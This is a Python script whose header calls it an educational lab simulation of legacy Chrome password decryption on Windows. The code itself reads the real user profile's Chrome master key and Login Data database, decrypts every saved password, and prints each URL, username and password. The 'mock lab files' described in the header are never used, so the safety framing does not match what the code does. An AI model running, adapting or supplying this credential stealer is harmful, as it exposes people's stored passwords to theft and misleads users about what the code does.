
# ==============================================================================
# NOTE: Educational & Lab Simulation Only
#
# This script demonstrates the legacy Chrome password decryption mechanism (v10/v11)
# using Windows DPAPI and AES-GCM.
#
# Why this no longer works on modern Chrome (v127+):
# Starting in mid-2024, Google introduced App-Bound Encryption (v20).
# The master encryption key is now protected by a SYSTEM-level service that verifies
# the identity and signature of the requesting application, blocking standard
# user-level scripts from decrypting browser data.
#
# ------------------------------------------------------------------------------
# 1. Install dependencies:
#    pip install pywin32 pycryptodome
#
# 2. Generate the mock encrypted database & master key:
#    python create_lab.py
#
# 3. Run the decryption script on the generated lab files:
#    python read_lab.py
# ==============================================================================




import os
import shutil
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES

def get_ecnryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    iv = password[3:15]
    password = password[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(password)[:-16].decode()

if __name__ == "__main__":
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    login_data_copy = "login_data_temp.db"
    shutil.copyfile(db_path, login_data_copy)

    conn = sqlite3.connect(login_data_copy)
    cursor = conn.cursor()

    encrypted_chrome_data = cursor.execute("SELECT origin_url, username_value, password_value FROM logins;").fetchall()
    windows_userkey = get_ecnryption_key()
    for row in encrypted_chrome_data:
        site_url, username, encrypted_password = row
        password = decrypt_password(encrypted_password, windows_userkey)
        if len(password) > 0 and len(username) > 0:
            print("URL: {} , Username:{}, Password:{}".format(site_url, username, password))
